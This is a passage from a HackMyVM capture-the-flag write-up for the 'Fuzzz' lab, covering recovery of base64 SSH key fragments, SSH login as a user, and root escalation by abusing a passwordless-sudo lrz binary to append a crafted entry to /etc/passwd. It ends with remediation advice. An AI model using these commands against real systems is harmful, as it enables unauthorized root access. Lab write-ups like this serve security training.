+</code></pre><p>I wrote a script to automate brute-forcing each character across the full ASCII range, extracting the hidden content from each <code>/line</code> endpoint.</p>
+<pre tabindex="0"><code>cat extraction.sh
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/fuzzz-hackmyvm/extraction-results_hu_39acbffff42f4ee5.webp 330w,http://localhost:1313/posts/fuzzz-hackmyvm/extraction-results_hu_ba5d4af30e9f07ee.webp 660w
+            
+              
+                ,http://localhost:1313/posts/fuzzz-hackmyvm/extraction-results_hu_1c43186ec9f79686.webp 907w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/fuzzz-hackmyvm/extraction-results_hu_1c43186ec9f79686.webp 907w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="907"
+        height="114"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/fuzzz-hackmyvm/extraction-results_hu_39a6f632079c66e9.png" srcset="http://localhost:1313/posts/fuzzz-hackmyvm/extraction-results_hu_11da84a482c18c04.png 330w,http://localhost:1313/posts/fuzzz-hackmyvm/extraction-results_hu_39a6f632079c66e9.png 660w
+          
+            ,http://localhost:1313/posts/fuzzz-hackmyvm/extraction-results.png 907w
+          
+          
+            ,http://localhost:1313/posts/fuzzz-hackmyvm/extraction-results.png 907w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The extracted values were base64-encoded strings. Decoding the first fragment confirmed it was part of an OpenSSH private key.</p>
+<pre tabindex="0"><code>echo &#39;b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW&#39; | base64 -d
+openssh-key-v1nonenone3
+                       ssh-ebase64: invalid input
+</code></pre><p>The final fragment revealed the key belonged to the <code>asahi</code> user.</p>
+<pre tabindex="0"><code>echo &#39;5felyfQYYF+CjURC1emDAAAACWFzYWhpQHBoaQECAwQ=&#39; | base64 -d
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/fuzzz-hackmyvm/base64-lastline_hu_86b332c88177a000.webp 330w,http://localhost:1313/posts/fuzzz-hackmyvm/base64-lastline_hu_30d2a23687a4287.webp 660w
+            
+              
+                ,http://localhost:1313/posts/fuzzz-hackmyvm/base64-lastline_hu_6c195a3c0f7a99da.webp 931w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/fuzzz-hackmyvm/base64-lastline_hu_6c195a3c0f7a99da.webp 931w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="931"
+        height="124"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/fuzzz-hackmyvm/base64-lastline_hu_7c426af037869442.png" srcset="http://localhost:1313/posts/fuzzz-hackmyvm/base64-lastline_hu_9a36ee89f770dc23.png 330w,http://localhost:1313/posts/fuzzz-hackmyvm/base64-lastline_hu_7c426af037869442.png 660w
+          
+            ,http://localhost:1313/posts/fuzzz-hackmyvm/base64-lastline.png 931w
+          
+          
+            ,http://localhost:1313/posts/fuzzz-hackmyvm/base64-lastline.png 931w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-6-lateral-movement" class="relative group">Step 6: Lateral Movement <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-6-lateral-movement" aria-label="Anchor">#</a></span></h2><p>I referenced a sample SSH key to understand the proper format.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/fuzzz-hackmyvm/sshkey-reference_hu_568874914cd93e3f.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="639"
+        height="140"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/fuzzz-hackmyvm/sshkey-reference.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>After reassembling all the extracted base64 fragments, I added the standard OpenSSH private key headers.</p>
+<pre tabindex="0"><code>-----BEGIN OPENSSH PRIVATE KEY-----
+</code></pre><pre tabindex="0"><code>-----END OPENSSH PRIVATE KEY-----
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/fuzzz-hackmyvm/sshkey-formatting_hu_9ecbf7bbdb75c131.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="547"
+        height="137"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/fuzzz-hackmyvm/sshkey-formatting.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Using the reconstructed key, I authenticated successfully as <code>asahi</code>.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/fuzzz-hackmyvm/ssh-asahi-auth_hu_c5245cbcec4f27c3.webp 330w,http://localhost:1313/posts/fuzzz-hackmyvm/ssh-asahi-auth_hu_303a94e77257eaa3.webp 660w
+            
+              
+                ,http://localhost:1313/posts/fuzzz-hackmyvm/ssh-asahi-auth_hu_24fd62647a80214c.webp 853w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/fuzzz-hackmyvm/ssh-asahi-auth_hu_24fd62647a80214c.webp 853w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="853"
+        height="158"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/fuzzz-hackmyvm/ssh-asahi-auth_hu_4ddd74b6c89e0865.png" srcset="http://localhost:1313/posts/fuzzz-hackmyvm/ssh-asahi-auth_hu_a6c2fb75ce14376c.png 330w,http://localhost:1313/posts/fuzzz-hackmyvm/ssh-asahi-auth_hu_4ddd74b6c89e0865.png 660w
+          
+            ,http://localhost:1313/posts/fuzzz-hackmyvm/ssh-asahi-auth.png 853w
+          
+          
+            ,http://localhost:1313/posts/fuzzz-hackmyvm/ssh-asahi-auth.png 853w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-7-privilege-escalation" class="relative group">Step 7: Privilege Escalation <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-7-privilege-escalation" aria-label="Anchor">#</a></span></h2><p>I checked sudo permissions for <code>asahi</code> and found the binary <code>/usr/local/bin/lrz</code> could be run without a password.</p>
+<pre tabindex="0"><code>sudo -l
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/fuzzz-hackmyvm/sudo-l-asahi_hu_4b396aaf43fa7ed8.webp 330w,http://localhost:1313/posts/fuzzz-hackmyvm/sudo-l-asahi_hu_71b50505344338ff.webp 660w
+            
+              
+                ,http://localhost:1313/posts/fuzzz-hackmyvm/sudo-l-asahi_hu_4c90763a9ac979d1.webp 727w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/fuzzz-hackmyvm/sudo-l-asahi_hu_4c90763a9ac979d1.webp 727w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="727"
+        height="147"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/fuzzz-hackmyvm/sudo-l-asahi_hu_5267b6ac5c361f0e.png" srcset="http://localhost:1313/posts/fuzzz-hackmyvm/sudo-l-asahi_hu_a8dd1574d59a7cd4.png 330w,http://localhost:1313/posts/fuzzz-hackmyvm/sudo-l-asahi_hu_5267b6ac5c361f0e.png 660w
+          
+            ,http://localhost:1313/posts/fuzzz-hackmyvm/sudo-l-asahi.png 727w
+          
+          
+            ,http://localhost:1313/posts/fuzzz-hackmyvm/sudo-l-asahi.png 727w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I inspected the binary and discovered it was a file transfer utility supporting ZMODEM/YMODEM/XMODEM protocols.</p>
+<pre tabindex="0"><code>sudo /usr/local/bin/lrz -h
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/fuzzz-hackmyvm/lrz-help_hu_41dc41cfe87ef44a.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="521"
+        height="64"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/fuzzz-hackmyvm/lrz-help.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The <code>--append</code> flag combined with <code>--tcp-server</code> mode allowed me to append arbitrary data to files over a TCP connection. I abused this to overwrite <code>/etc/passwd</code> with a custom entry containing a root-privileged user.</p>
+<p>First, I generated a password hash for the new user.</p>
+<pre tabindex="0"><code>openssl passwd -1 -salt hello &#39;&lt;REDACTED&gt;&#39;
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/fuzzz-hackmyvm/openssl-passwd_hu_d00155a1f03515e1.webp 330w,http://localhost:1313/posts/fuzzz-hackmyvm/openssl-passwd_hu_54d7ec88b139de3f.webp 660w
+            
+              
+                ,http://localhost:1313/posts/fuzzz-hackmyvm/openssl-passwd_hu_6c2dff2fd6684f56.webp 733w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/fuzzz-hackmyvm/openssl-passwd_hu_6c2dff2fd6684f56.webp 733w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="733"
+        height="116"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/fuzzz-hackmyvm/openssl-passwd_hu_fa582d6dea3757c8.png" srcset="http://localhost:1313/posts/fuzzz-hackmyvm/openssl-passwd_hu_799c01f0e199717e.png 330w,http://localhost:1313/posts/fuzzz-hackmyvm/openssl-passwd_hu_fa582d6dea3757c8.png 660w
+          
+            ,http://localhost:1313/posts/fuzzz-hackmyvm/openssl-passwd.png 733w
+          
+          
+            ,http://localhost:1313/posts/fuzzz-hackmyvm/openssl-passwd.png 733w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I navigated to <code>/etc</code> and started the lrz server in append mode.</p>
+<pre tabindex="0"><code>cd /etc
+sudo /usr/local/bin/lrz --append --tcp-server
+</code></pre><p>From my machine, I connected and transferred a crafted <code>passwd</code> file containing the new root user.</p>
+<pre tabindex="0"><code>sz --tcp-client 192.168.56.110:43090
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/fuzzz-hackmyvm/lrz-transfer_hu_99e027880e734c9a.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="503"
+        height="54"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/fuzzz-hackmyvm/lrz-transfer.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I switched to the newly created user and confirmed root access.</p>
+<pre tabindex="0"><code>/etc # id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/fuzzz-hackmyvm/root-access_hu_c3231b9b3461de18.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="423"
+        height="82"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/fuzzz-hackmyvm/root-access.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="conclusion" class="relative group">Conclusion <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#conclusion" aria-label="Anchor">#</a></span></h2><p>This lab demonstrated a full compromise of a Linux machine through a chain of creative misconfigurations and tool abuse:</p>
+<ol>
+<li>A fake ADB service on port 5555 provided an initial interactive shell.</li>
+<li>Port forwarding revealed a hidden web application running internally on port 80.</li>
+<li>Character-by-character extraction from the web endpoints recovered base64-encoded SSH key fragments.</li>
+<li>Reassembling the fragments yielded a valid SSH private key for the <code>asahi</code> user.</li>
+<li>The <code>lrz</code> binary, runnable via sudo without a password, was abused to overwrite <code>/etc/passwd</code> and gain root.</li>
+</ol>
+<p>To secure the environment, the following remediations are recommended:</p>
+<ul>
+<li><strong>Remove fake ADB services</strong> and ensure only legitimate debugging interfaces are exposed.</li>
+<li><strong>Restrict internal web applications</strong> to localhost only and enforce authentication.</li>
+<li><strong>Avoid embedding secrets in web responses</strong>, even as encoded or obfuscated data.</li>
+<li><strong>Audit sudo permissions</strong> and remove unnecessary binary executions, especially file transfer utilities with append capabilities.</li>
+<li><strong>Monitor <code>/etc/passwd</code> modifications</strong> and use file integrity monitoring to detect unauthorized changes.</li>
+</ul>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+      
+      
+        
+        
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+      
+    >
+      
+      
+      
+      
+      <img
+        width="960"
+        height="1280"
+        class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+        alt="k40t1k"
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/img/k40t1k_hu_ebd2a57fb32cf973.jpeg" srcset="http://localhost:1313/img/k40t1k_hu_210ca2abc75c60a7.jpeg 330w,http://localhost:1313/img/k40t1k_hu_ebd2a57fb32cf973.jpeg 660w
+          
+            ,http://localhost:1313/img/k40t1k.jpeg 960w
+          
+          
+            ,http://localhost:1313/img/k40t1k.jpeg 960w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+      
+    
+    <div class="place-self-center">
+      
+        <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+          Author
+        </div>
+        <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+          k40t1k
+        </div>
+      
+      
+      <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://github.com/jkilonzi"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://linkedin.com/in/john-maluki"
+          target="_blank"
+          aria-label="Linkedin"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://medium.com/@jkilonzi301"
+          target="_blank"
+          aria-label="Medium"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M180.5,74.262C80.813,74.262,0,155.633,0,256S80.819,437.738,180.5,437.738,361,356.373,361,256,280.191,74.262,180.5,74.262Zm288.25,10.646c-49.845,0-90.245,76.619-90.245,171.095s40.406,171.1,90.251,171.1,90.251-76.619,90.251-171.1H559C559,161.5,518.6,84.908,468.752,84.908Zm139.506,17.821c-17.526,0-31.735,68.628-31.735,153.274s14.2,153.274,31.735,153.274S640,340.631,640,256C640,171.351,625.785,102.729,608.258,102.729Z"/></svg>
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="http://localhost:1313/posts/devoops-hackmyvm/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Devoops — HackMyVM</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2026-08-24 16:14:11 &#43;0300 EAT">24 August 2026</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+      </main>
+      
+        <div
+          class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12"
+          id="to-top"
+          hidden="true"
+        >
+          <a
+            href="#the-top"
+            class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+            aria-label="Scroll to top"
+            title="Scroll to top"
+          >
+            &uarr;
+          </a>
+        </div>
+      <footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2026
+            k40t1k
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
